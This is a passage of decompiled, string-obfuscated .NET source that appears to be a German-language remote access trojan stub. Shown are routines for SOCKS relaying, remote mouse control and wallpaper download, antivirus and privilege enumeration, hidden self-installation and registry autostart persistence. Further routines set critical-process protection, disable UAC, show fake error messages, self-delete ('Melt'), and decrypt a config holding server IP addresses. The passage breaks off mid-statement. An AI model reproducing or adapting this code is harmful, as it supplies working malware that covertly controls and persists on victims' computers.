							if (stream2.DataAvailable)
							{
								byte[] array11 = new byte[10000];
								int num2 = stream2.Read(array11, 0, 10000);
								byte[] array12 = new byte[num2 - 1 + 1];
								Array.Copy(array11, array12, num2);
								stream.Write(array12, 0, array12.Length);
							}
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							flag = true;
							ProjectData.ClearProjectError();
						}
					}
					if (socksClient.Connected)
					{
						socksClient.Close();
					}
					if (serverClient.Connected)
					{
						serverClient.Close();
					}
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
			}
		}
	}

	private const int SPI_SETDESKWALLPAPER = 20;

	private const int SPIF_UPDATEINIFILE = 1;

	public static cProtect CriticalProzess = new cProtect();

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern void mouse_event(int dwFlags, int dx, int dy, int cButtons, int dwExtraInfo);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SystemParametersInfoA(int uAction, int uParam, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpvParam, int fuWinIni);

	public static void ChangeWallpaper(string sLink)
	{
		try
		{
			WebClient webClient = new WebClient();
			string text = sLink.Substring(checked(sLink.Length - 4));
			if (!File.Exists(Path.GetTempPath() + GClass0.smethod_0("~ũɫ\u036aѵեٳݧ\u0873") + text))
			{
				webClient.DownloadFile(sLink, Path.GetTempPath() + GClass0.smethod_0("~ũɫ\u036aѵեٳݧ\u0873") + text);
			}
			else
			{
				File.Delete(Path.GetTempPath() + GClass0.smethod_0("~ũɫ\u036aѵեٳݧ\u0873") + text);
				webClient.DownloadFile(sLink, Path.GetTempPath() + GClass0.smethod_0("~ũɫ\u036aѵեٳݧ\u0873") + text);
			}
			Image val = Image.FromFile(Path.GetTempPath() + GClass0.smethod_0("~ũɫ\u036aѵեٳݧ\u0873") + text);
			val.Save(Path.GetTempPath() + GClass0.smethod_0("Rźɭ\u0367Ѧչ٩ݷࡣॷਪୡ౯൱"), ImageFormat.get_Bmp());
			string lpvParam = Path.GetTempPath() + GClass0.smethod_0("Rźɭ\u0367Ѧչ٩ݷࡣॷਪୡ౯൱");
			SystemParametersInfoA(20, 0, ref lpvParam, 1);
			try
			{
				File.Delete(Path.GetTempPath() + GClass0.smethod_0("~ũɫ\u036aѵեٳݧ\u0873") + text);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			try
			{
				File.Delete(Path.GetTempPath() + GClass0.smethod_0("Rźɭ\u0367Ѧչ٩ݷࡣॷਪ୩\u0c72൦"));
				File.Delete(Path.GetTempPath() + GClass0.smethod_0("Rźɭ\u0367Ѧչ٩ݷࡣॷਪୡ౯൱"));
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}

	public static void MausKlick(int x, int y, string Taste = "r")
	{
		if (Operators.CompareString(Taste, GClass0.smethod_0("s"), false) == 0)
		{
			Point position = new Point(x, y);
			Cursor.set_Position(position);
			mouse_event(2, 0, 0, 0, 0);
			mouse_event(4, 0, 0, 0, 0);
		}
		else if (Operators.CompareString(Taste, GClass0.smethod_0("m"), false) != 0)
		{
		}
	}

	public static Bitmap PicResizeByWidth(Image SourceImage, int NewWidth)
	{
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		//IL_002f: Expected O, but got Unknown
		decimal d = new decimal((double)NewWidth / (double)SourceImage.get_Width());
		int num = Convert.ToInt32(decimal.Multiply(d, new decimal(SourceImage.get_Height())));
		Bitmap val = new Bitmap(NewWidth, num);
		Graphics val2 = Graphics.FromImage((Image)(object)val);
		try
		{
			val2.set_InterpolationMode((InterpolationMode)7);
			Rectangle rectangle = new Rectangle(0, 0, NewWidth, num);
			val2.DrawImage(SourceImage, rectangle);
			return val;
		}
		finally
		{
			((IDisposable)val2)?.Dispose();
		}
	}

	public static byte[] Image2ByteArray(Image Bild, ImageFormat Bildformat)
	{
		MemoryStream memoryStream = new MemoryStream();
		Bild.Save((Stream)memoryStream, Bildformat);
		memoryStream.Flush();
		return memoryStream.ToArray();
	}

	public static void MesboxShow(MsgBoxDetaills m)
	{
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_005a: Unknown result type (might be due to invalid IL or missing references)
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ba: Unknown result type (might be due to invalid IL or missing references)
		if (Operators.CompareString(m.Style, GClass0.smethod_0("1"), false) == 0)
		{
			Interaction.MsgBox((object)m.Text, (MsgBoxStyle)16, (object)m.Titel);
		}
		if (Operators.CompareString(m.Style, GClass0.smethod_0("0"), false) == 0)
		{
			Interaction.MsgBox((object)m.Text, (MsgBoxStyle)32, (object)m.Titel);
		}
		if (Operators.CompareString(m.Style, GClass0.smethod_0("3"), false) == 0)
		{
			Interaction.MsgBox((object)m.Text, (MsgBoxStyle)64, (object)m.Titel);
		}
		if (Operators.CompareString(m.Style, GClass0.smethod_0("2"), false) == 0)
		{
			Interaction.MsgBox((object)m.Text, (MsgBoxStyle)48, (object)m.Titel);
		}
	}

	public static void Sprechen(string sText)
	{
		try
		{
			object obj = Interaction.CreateObject(GClass0.smethod_0("_Ūɺ\u0360ЦՔٶݓ\u086b४\u0a61\u0b64"), GClass0.smethod_0(""));
			string text = GClass0.smethod_0("VŴɦ\u0363Ѫ");
			object[] array = new object[1] { sText };
			bool[] array2 = new bool[1] { true };
			object obj2 = NewLateBinding.LateGet(obj, (Type)null, text, array, (string[])null, (Type[])null, array2);
			if (array2[0])
			{
				sText = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
			}
			Conversions.ToString(obj2);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static string GetAntivirus()
	{
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		//IL_003f: Expected O, but got Unknown
		//IL_005d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0064: Expected O, but got Unknown
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string text = default(string);
		string text2 = default(string);
		ManagementObjectSearcher val = default(ManagementObjectSearcher);
		ManagementObjectCollection val2 = default(ManagementObjectCollection);
		ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
		ManagementObject val3 = default(ManagementObject);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 291:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_000e;
						case 4:
							goto IL_003f;
						case 5:
							goto IL_0049;
						case 6:
							goto IL_0064;
						case 7:
							goto IL_007e;
						case 8:
							goto IL_0095;
						case 9:
							goto IL_00ac;
						case 11:
							goto IL_00c0;
						case 12:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 10:
						case 13:
						case 14:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_00c0:
					num = 11;
					break;
					IL_00ac:
					num = 9;
					text = GClass0.smethod_0("@Ťɯ\u0363Ѿԩٯݢࡠ॰੪୧౧൯");
					goto end_IL_0000_3;
					IL_0009:
					num = 2;
					text2 = null;
					goto IL_000e;
					IL_000e:
					num = 3;
					val = new ManagementObjectSearcher(GClass0.smethod_0("^ŝ") + Environment.MachineName + GClass0.smethod_0("IŦɼͽѥՌ\u065cݫ\u086eॹ\u0a79\u0b63౽൱ไལ\u106bᅰቦ፰ᐳ"), GClass0.smethod_0("MŘɐ\u035eљՍظ\u073d࠶\u0953\u0a46ଡ଼\u0c5fറ๑ཡၺᅤቺ።ᑸᕼᙻ\u1757ᡴᥪ\u1a60᭶ᱡᵵ"));
					goto IL_003f;
					IL_003f:
					num = 4;
					val2 = val.Get();
					goto IL_0049;
					IL_0049:
					num = 5;
					enumerator = val2.GetEnumerator();
					goto IL_0081;
					IL_0081:
					if (enumerator.MoveNext())
					{
						val3 = (ManagementObject)enumerator.get_Current();
						goto IL_0064;
					}
					((IDisposable)enumerator)?.Dispose();
					goto IL_0095;
					IL_0064:
					num = 6;
					text2 = ((ManagementBaseObject)val3).get_Item(GClass0.smethod_0("oţɺ\u0378ѫէټ\u074aࡢ९\u0a64")).ToString();
					goto IL_007e;
					IL_007e:
					num = 7;
					goto IL_0081;
					IL_0095:
					num = 8;
					if (Operators.CompareString(text2, GClass0.smethod_0(""), false) == 0)
					{
						goto IL_00ac;
					}
					goto IL_00c0;
					end_IL_0000_2:
					break;
				}
				num = 12;
				text = text2;
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 291;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		string result = text;
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static int RandomNumber(int min, int max)
	{
		Random random = new Random();
		return random.Next(min, max);
	}

	public static string GetUserPrvilegs()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string text = default(string);
		WindowsPrincipal windowsPrincipal = default(WindowsPrincipal);
		WindowsIdentity current = default(WindowsIdentity);
		string text2 = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 308:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_0012;
						case 4:
							goto IL_001c;
						case 5:
							goto IL_0021;
						case 6:
							goto IL_0031;
						case 7:
						case 8:
							goto IL_003f;
						case 9:
							goto IL_004f;
						case 10:
						case 11:
							goto IL_005e;
						case 12:
							goto IL_006f;
						case 13:
						case 14:
							goto IL_007e;
						case 15:
							goto IL_008f;
						case 16:
						case 17:
							goto IL_009e;
						case 18:
							goto IL_00af;
						case 19:
						case 20:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 21:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_00af:
					num = 18;
					text = GClass0.smethod_0("]ŴɿͿѯդ٧ݷࡣॷ\u0a65୷౭൳");
					break;
					IL_009e:
					num = 17;
					if (!windowsPrincipal.IsInRole(WindowsBuiltInRole.SystemOperator))
					{
						break;
					}
					goto IL_00af;
					IL_0009:
					num = 2;
					current = WindowsIdentity.GetCurrent();
					goto IL_0012;
					IL_0012:
					num = 3;
					windowsPrincipal = new WindowsPrincipal(current);
					goto IL_001c;
					IL_001c:
					num = 4;
					text = null;
					goto IL_0021;
					IL_0021:
					num = 5;
					if (windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator))
					{
						goto IL_0031;
					}
					goto IL_003f;
					IL_0031:
					num = 6;
					text = GClass0.smethod_0("DŠɮ\u036bѯ");
					goto IL_003f;
					IL_003f:
					num = 8;
					if (windowsPrincipal.IsInRole(WindowsBuiltInRole.User))
					{
						goto IL_004f;
					}
					goto IL_005e;
					IL_004f:
					num = 9;
					text = GClass0.smethod_0("QŰɧͳ");
					goto IL_005e;
					IL_005e:
					num = 11;
					if (windowsPrincipal.IsInRole(WindowsBuiltInRole.Guest))
					{
						goto IL_006f;
					}
					goto IL_007e;
					IL_006f:
					num = 12;
					text = GClass0.smethod_0("Bűɦͱѵ");
					goto IL_007e;
					IL_007e:
					num = 14;
					if (windowsPrincipal.IsInRole(WindowsBuiltInRole.PowerUser))
					{
						goto IL_008f;
					}
					goto IL_009e;
					IL_008f:
					num = 15;
					text = GClass0.smethod_0("Yŧɰ\u0363ѷձ\u0670ݧ\u0873");
					goto IL_009e;
					end_IL_0000_2:
					break;
				}
				num = 20;
				text2 = text;
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 308;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		string result = text2;
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static bool ServerInstallation()
	{
		//IL_0106: Unknown result type (might be due to invalid IL or missing references)
		//IL_0143: Unknown result type (might be due to invalid IL or missing references)
		//IL_016d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0197: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_0321: Unknown result type (might be due to invalid IL or missing references)
		//IL_034b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0375: Unknown result type (might be due to invalid IL or missing references)
		//IL_039f: Unknown result type (might be due to invalid IL or missing references)
		//IL_03e1: Unknown result type (might be due to invalid IL or missing references)
		//IL_040b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0435: Unknown result type (might be due to invalid IL or missing references)
		//IL_045f: Unknown result type (might be due to invalid IL or missing references)
		if (Module2.ServerInstallieren)
		{
			if (File.Exists(Interaction.Environ(Module2.InstallationsOrdner) + GClass0.smethod_0("PŘɼ\u036aѠըٵݱ\u082aॡ\u0a63୵")))
			{
				if (!Application.get_ExecutablePath().Contains(GClass0.smethod_0("Xżɪ\u0360Ѩյٱܪࡡ\u0963\u0a75")))
				{
					if (Application.get_ExecutablePath().Contains(GClass0.smethod_0("qŰɲͶѡԪ٦ݺࡤ")))
					{
						try
						{
							Thread.Sleep(10000);
							try
							{
								((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Interaction.Environ(Module2.InstallationsOrdner) + GClass0.smethod_0("PŘɼ\u036aѠըٵݱ\u082aॡ\u0a63୵"));
							}
							catch (Exception projectError)
							{
								ProjectData.SetProjectError(projectError);
								ProjectData.ClearProjectError();
							}
							File.Copy(Application.get_ExecutablePath(), Interaction.Environ(Module2.InstallationsOrdner) + GClass0.smethod_0("PŘɼ\u036aѠըٵݱ\u082aॡ\u0a63୵"));
							Interaction.Shell(Interaction.Environ(Module2.InstallationsOrdner) + GClass0.smethod_0("PŘɼ\u036aѠըٵݱ\u082aॡ\u0a63୵"), (AppWinStyle)2, false, -1);
						}
						catch (Exception ex)
						{
							ProjectData.SetProjectError(ex);
							Exception ex2 = ex;
							Interaction.MsgBox((object)(GClass0.smethod_0("yŬɦ\u032dѮբ٤ܩ\u087dॷ\u0a62\u0b64\u0c70൦ฏ་") + ex2.Message), (MsgBoxStyle)0, (object)null);
							ProjectData.ClearProjectError();
						}
						return false;
					}
					if (Module2.ErrorMessage)
					{
						if (Operators.CompareString(Module2.ErrorMessageStyle, GClass0.smethod_0("kŵɯͱѭՠ٣ݭ"), false) == 0)
						{
							Interaction.MsgBox((object)Module2.ErrorMessageText, (MsgBoxStyle)16, (object)Module2.ErrorMessageTitel);
						}
						if (Operators.CompareString(Module2.ErrorMessageStyle, GClass0.smethod_0("mŭɤ\u036e"), false) == 0)
						{
							Interaction.MsgBox((object)Module2.ErrorMessageText, (MsgBoxStyle)64, (object)Module2.ErrorMessageTitel);
						}
						if (Operators.CompareString(Module2.ErrorMessageStyle, GClass0.smethod_0("tűɦͱѵ"), false) == 0)
						{
							Interaction.MsgBox((object)Module2.ErrorMessageText, (MsgBoxStyle)32, (object)Module2.ErrorMessageTitel);
						}
						if (Operators.CompareString(Module2.ErrorMessageStyle, GClass0.smethod_0("gŹ"), false) == 0)
						{
							Interaction.MsgBox((object)Module2.ErrorMessageText, (MsgBoxStyle)48, (object)Module2.ErrorMessageTitel);
						}
					}
					if (Module2.Melt)
					{
						smethod_0();
					}
					return false;
				}
				MyProject.Forms.Form1.m = new Mutex(initiallyOwned: false, Module2.MutexString);
				if (!MyProject.Forms.Form1.m.WaitOne(0, exitContext: false))
				{
					MyProject.Forms.Form1.m.Close();
					MyProject.Forms.Form1.m = null;
					return false;
				}
				if (Module2.SystemProzessSetzen)
				{
					CriticalProzess.ProtectProcess(bProtect: true);
				}
				AutostartSetzen(Module2.Autostart_CurrentUser, Module2.Autostart_LocalMashine, Module2.Autostart_AxtivX);
				if (Module2.UAC_Deaktivieren)
				{
					UAC_Deakrivieren(ja: true);
				}
				return true;
			}
			File.Copy(Application.get_ExecutablePath(), Interaction.Environ(Module2.InstallationsOrdner) + GClass0.smethod_0("PŘɼ\u036aѠըٵݱ\u082aॡ\u0a63୵"));
			FileInfo fileInfo = new FileInfo(Interaction.Environ(Module2.InstallationsOrdner) + GClass0.smethod_0("PŘɼ\u036aѠըٵݱ\u082aॡ\u0a63୵"));
			if (Module2.Attribut_Versteckt)
			{
				FileInfo fileInfo2 = fileInfo;
				fileInfo2.Attributes = (FileAttributes)Conversions.ToInteger(Conversions.ToString((int)fileInfo2.Attributes) + Conversions.ToString(2));
			}
			Interaction.Shell(Interaction.Environ(Module2.InstallationsOrdner) + GClass0.smethod_0("PŘɼ\u036aѠըٵݱ\u082aॡ\u0a63୵"), (AppWinStyle)2, false, -1);
			if (Module2.ErrorMessage)
			{
				if (Operators.CompareString(Module2.ErrorMessageStyle, GClass0.smethod_0("kŵɯͱѭՠ٣ݭ"), false) == 0)
				{
					Interaction.MsgBox((object)Module2.ErrorMessageText, (MsgBoxStyle)16, (object)Module2.ErrorMessageTitel);
				}
				if (Operators.CompareString(Module2.ErrorMessageStyle, GClass0.smethod_0("mŭɤ\u036e"), false) == 0)
				{
					Interaction.MsgBox((object)Module2.ErrorMessageText, (MsgBoxStyle)64, (object)Module2.ErrorMessageTitel);
				}
				if (Operators.CompareString(Module2.ErrorMessageStyle, GClass0.smethod_0("tűɦͱѵ"), false) == 0)
				{
					Interaction.MsgBox((object)Module2.ErrorMessageText, (MsgBoxStyle)32, (object)Module2.ErrorMessageTitel);
				}
				if (Operators.CompareString(Module2.ErrorMessageStyle, GClass0.smethod_0("gŹ"), false) == 0)
				{
					Interaction.MsgBox((object)Module2.ErrorMessageText, (MsgBoxStyle)48, (object)Module2.ErrorMessageTitel);
				}
			}
			if (Module2.Melt)
			{
				smethod_0();
			}
			return false;
		}
		if (Module2.ErrorMessage)
		{
			if (Operators.CompareString(Module2.ErrorMessageStyle, GClass0.smethod_0("kŵɯͱѭՠ٣ݭ"), false) == 0)
			{
				Interaction.MsgBox((object)Module2.ErrorMessageText, (MsgBoxStyle)16, (object)Module2.ErrorMessageTitel);
			}
			if (Operators.CompareString(Module2.ErrorMessageStyle, GClass0.smethod_0("mŭɤ\u036e"), false) == 0)
			{
				Interaction.MsgBox((object)Module2.ErrorMessageText, (MsgBoxStyle)64, (object)Module2.ErrorMessageTitel);
			}
			if (Operators.CompareString(Module2.ErrorMessageStyle, GClass0.smethod_0("tűɦͱѵ"), false) == 0)
			{
				Interaction.MsgBox((object)Module2.ErrorMessageText, (MsgBoxStyle)32, (object)Module2.ErrorMessageTitel);
			}
			if (Operators.CompareString(Module2.ErrorMessageStyle, GClass0.smethod_0("gŹ"), false) == 0)
			{
				Interaction.MsgBox((object)Module2.ErrorMessageText, (MsgBoxStyle)48, (object)Module2.ErrorMessageTitel);
			}
		}
		return true;
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetModuleFileNameA(int hModule, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileName, int nSize);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int ExitProcess(uint uExitCode);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int MoveFileExW([In][MarshalAs(UnmanagedType.LPTStr)] string lpExistingFileName, [In][MarshalAs(UnmanagedType.LPTStr)] string lpNewFileName, long dwFlags);

	public static void smethod_0()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		FileInfo fileInfo = default(FileInfo);
		RegistryKey currentUser = default(RegistryKey);
		RegistryKey localMachine = default(RegistryKey);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				string executablePath;
				string lpFileName;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 396:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_002b;
						case 4:
							goto IL_0039;
						case 5:
							goto IL_0043;
						case 6:
							goto IL_004c;
						case 7:
						case 8:
							goto IL_0069;
						case 9:
							goto IL_0073;
						case 10:
							goto IL_007d;
						case 11:
						case 12:
							goto IL_009b;
						case 13:
							goto IL_00b3;
						case 14:
							goto IL_00c7;
						case 15:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 16:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_00c7:
					num = 14;
					executablePath = Application.get_ExecutablePath();
					lpFileName = Application.get_ExecutablePath();
					MoveFileExW(Strings.Left(executablePath, GetModuleFileNameA(0, ref lpFileName, 256)), Path.GetTempPath() + GClass0.smethod_0("YŰɮͲц") + DateTime.Now.Millisecond + GClass0.smethod_0("*ŷɯͱ"), 8L);
					break;
					IL_00b3:
					num = 13;
					MyProject.Forms.Form1.m = null;
					goto IL_00c7;
					IL_0009:
					num = 2;
					fileInfo = new FileInfo(Interaction.Environ(Module2.InstallationsOrdner) + GClass0.smethod_0("PŘɼ\u036aѠըٵݱ\u082aॡ\u0a63୵"));
					goto IL_002b;
					IL_002b:
					num = 3;
					fileInfo.Attributes = FileAttributes.Normal;
					goto IL_0039;
					IL_0039:
					num = 4;
					if (Module2.Autostart_CurrentUser)
					{
						goto IL_0043;
					}
					goto IL_0069;
					IL_0043:
					num = 5;
					currentUser = Registry.CurrentUser;
					goto IL_004c;
					IL_004c:
					num = 6;
					currentUser.CreateSubKey(GClass0.smethod_0("~ţɭ;Ѿթٵݣ\u0879३੪ୡ\u0c73൯\u0e4cདၛᅈቇፍᑐᕖᙓ\u1759ᡂ᥇ᩏ᭑᱄ᵂṝὋ⁃⅘≝⍏\u245b╛♎❉⡋⥘⩑⭗ⱏ")).DeleteValue(Module2.AutostartKey_CurrentUser);
					goto IL_0069;
					IL_0069:
					num = 8;
					if (Module2.Autostart_LocalMashine)
					{
						goto IL_0073;
					}
					goto IL_009b;
					IL_0073:
					num = 9;
					localMachine = Registry.LocalMachine;
					goto IL_007d;
					IL_007d:
					num = 10;
					localMachine.CreateSubKey(GClass0.smethod_0("~ţɭ;Ѿթٵݣ\u0879३੪ୡ\u0c73൯\u0e4cདၛᅈቇፍᑐᕖᙓ\u1759ᡂ᥇ᩏ᭑᱄ᵂṝὋ⁃⅘≝⍏\u245b╛♎❉⡋⥘⩑⭗ⱏ")).DeleteValue(Module2.AutostartKey_LocalMashine);
					goto IL_009b;
					IL_009b:
					num = 12;
					MyProject.Forms.Form1.m.Close();
					goto IL_00b3;
					end_IL_0000_2:
					break;
				}
				num = 15;
				Application.Exit();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 396;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void UpdateFromFile()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		FileInfo fileInfo = default(FileInfo);
		RegistryKey currentUser = default(RegistryKey);
		RegistryKey localMachine = default(RegistryKey);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				string executablePath;
				string lpFileName;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 440:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_002b;
						case 4:
							goto IL_0039;
						case 5:
							goto IL_0043;
						case 6:
							goto IL_004c;
						case 7:
						case 8:
							goto IL_0069;
						case 9:
							goto IL_0073;
						case 10:
							goto IL_007d;
						case 11:
						case 12:
							goto IL_009b;
						case 13:
							goto IL_00b3;
						case 14:
							goto IL_00c7;
						case 15:
							goto IL_00ef;
						case 16:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 17:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_00ef:
					num = 15;
					executablePath = Application.get_ExecutablePath();
					lpFileName = Application.get_ExecutablePath();
					MoveFileExW(Strings.Left(executablePath, GetModuleFileNameA(0, ref lpFileName, 256)), Path.GetTempPath() + GClass0.smethod_0("YŰɮͲц") + DateTime.Now.Millisecond + GClass0.smethod_0("*ŷɯͱ"), 8L);
					break;
					IL_00c7:
					num = 14;
					Process.Start(Interaction.Environ(GClass0.smethod_0("pŦɯͱ")) + GClass0.smethod_0("VűɰͲѶաتݦ\u087a।"));
					goto IL_00ef;
					IL_0009:
					num = 2;
					fileInfo = new FileInfo(Interaction.Environ(Module2.InstallationsOrdner) + GClass0.smethod_0("PŘɼ\u036aѠըٵݱ\u082aॡ\u0a63୵"));
					goto IL_002b;
					IL_002b:
					num = 3;
					fileInfo.Attributes = FileAttributes.Normal;
					goto IL_0039;
					IL_0039:
					num = 4;
					if (Module2.Autostart_CurrentUser)
					{
						goto IL_0043;
					}
					goto IL_0069;
					IL_0043:
					num = 5;
					currentUser = Registry.CurrentUser;
					goto IL_004c;
					IL_004c:
					num = 6;
					currentUser.CreateSubKey(GClass0.smethod_0("~ţɭ;Ѿթٵݣ\u0879३੪ୡ\u0c73൯\u0e4cདၛᅈቇፍᑐᕖᙓ\u1759ᡂ᥇ᩏ᭑᱄ᵂṝὋ⁃⅘≝⍏\u245b╛♎❉⡋⥘⩑⭗ⱏ")).DeleteValue(Module2.AutostartKey_CurrentUser);
					goto IL_0069;
					IL_0069:
					num = 8;
					if (Module2.Autostart_LocalMashine)
					{
						goto IL_0073;
					}
					goto IL_009b;
					IL_0073:
					num = 9;
					localMachine = Registry.LocalMachine;
					goto IL_007d;
					IL_007d:
					num = 10;
					localMachine.CreateSubKey(GClass0.smethod_0("~ţɭ;Ѿթٵݣ\u0879३੪ୡ\u0c73൯\u0e4cདၛᅈቇፍᑐᕖᙓ\u1759ᡂ᥇ᩏ᭑᱄ᵂṝὋ⁃⅘≝⍏\u245b╛♎❉⡋⥘⩑⭗ⱏ")).DeleteValue(Module2.AutostartKey_LocalMashine);
					goto IL_009b;
					IL_009b:
					num = 12;
					MyProject.Forms.Form1.m.Close();
					goto IL_00b3;
					IL_00b3:
					num = 13;
					MyProject.Forms.Form1.m = null;
					goto IL_00c7;
					end_IL_0000_2:
					break;
				}
				num = 16;
				Application.Exit();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 440;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private static string smethod_1(string Text)
	{
		return Decrypt(Text);
	}

	private static string smethod_2(string Text)
	{
		return Encrypt(Text);
	}

	public static string Decrypt(string sText)
	{
		string text = null;
		long num = Strings.Len(sText);
		checked
		{
			for (long num2 = 1L; num2 <= num; num2++)
			{
				text += Conversions.ToString(Strings.Chr(Strings.Asc(Strings.Mid(sText, (int)num2, 1)) - 1));
			}
			return text;
		}
	}

	public static string Encrypt(string sText)
	{
		string text = null;
		long num = Strings.Len(sText);
		checked
		{
			for (long num2 = 1L; num2 <= num; num2++)
			{
				text += Conversions.ToString(Strings.Chr(Strings.Asc(Strings.Mid(sText, (int)num2, 1)) + 1));
			}
			return text;
		}
	}

	public static void StubStringEinlesen()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		try
		{
			FixedLengthString val = new FixedLengthString(1000);
			val.set_Value(mResource.getData(GClass0.smethod_0("0"), GClass0.smethod_0("@łɖ\u0340")));
			string stubString = smethod_1(val.get_Value());
			string text = Conversions.ToString(_ReadFromStubString(GClass0.smethod_0("Kő"), stubString));
			string[] array = Strings.Split(text, GClass0.smethod_0("'Ĩȩ\u0322"), -1, (CompareMethod)0);
			foreach (string text2 in array)
			{
				if (Operators.CompareString(text2, GClass0.smethod_0(""), false) != 0)
				{
					Module2.VerbindungsInformationen item = default(Module2.VerbindungsInformationen);
					item.IpAdresse = Strings.Split(text2, GClass0.smethod_0("\u007f"), -1, (CompareMethod)0)[0];
